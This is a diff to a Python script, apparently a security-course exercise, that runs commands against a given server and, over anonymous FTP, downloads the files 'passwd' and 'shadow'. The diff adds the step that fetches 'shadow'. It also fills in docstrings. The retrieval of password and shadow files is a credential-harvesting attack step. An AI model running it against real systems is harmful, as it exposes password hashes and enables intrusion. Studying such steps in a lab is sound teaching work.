@@ -14,6 +14,7 @@ import ftplib
 import sys
 import os
 
+#defined variables for the program for easy access
 OutputFile = "outfile_csci3250.txt"
 FTP_User = "anonymous"
 FTP_Password = "anonymous@"
@@ -21,15 +22,14 @@ FTP_Password = "anonymous@"
 
 def run_command(cmd, output_file):
     """
-        This function will 
+        This function will run a given command and write the output to a file.
     
         Args:
-           cmd:
+           cmd (str): the command to be executed
            output_file (txt file): outfile_csci3250.txt
     
-        Returns:
-           
         """
+    
     header = "\n$ " + cmd + "\n"
     print(header, end="")
     output_file.write(header)
@@ -47,15 +47,14 @@ def run_command(cmd, output_file):
 
 def ftp_commands(server, output_file):
     """
-        This function will 
+        This function will connect to the FTP server, list directories, and download files.
     
         Args:
-           server:
+           server (str): the target server address
            output_file (txt file): outfile_csci3250.txt
-    
-        Returns:
-           
+               
         """
+    
     header = "\n--- FTP SESSION to "+server+" ---\n"
     print(header, end="")
     output_file.write(header)
@@ -93,29 +92,33 @@ def ftp_commands(server, output_file):
         output_file.write("Downloaded passwd\n")
 
         #download shadow
+        output_file.write("\nftp> get shadow\n")
+        print("\nftp> get shadow")
+        with open("shadow", "wb") as file:
+            ftp.retrbinary("RETR shadow", file.write)
+        output_file.write("Downloaded shadow\n")
 
         #close session
-
-    except ftplib.all_errors as e:
-        error_message = f"FTP error: {e}\n"
+        ftp.quit()
+        output_file.write("\nftp> bye\nFTP session closed.\n")
+        print("\nftp> bye")
+ 
+    except ftplib.all_errors as error:
+        error_message = f"FTP error: {error}\n"
         print(error_message)
         output_file.write(error_message)
 
     output_file.flush()  
 
+
 def main():
     """
-        The main function
-    
-        Args:
-            none
-
-        Returns:
-           
+        The main function will use the pre-defined functions to run commands and perform FTP operations on the target server.
+               
         """
 
     if len(sys.argv) != 2:
-        print("Use the syntax: python myAutoCommand.py <server_address>")
+        print("Use the syntax: python3 myAutoCommand.py <server_address>")
         sys.exit(1)
 
     server_address = sys.argv[1]
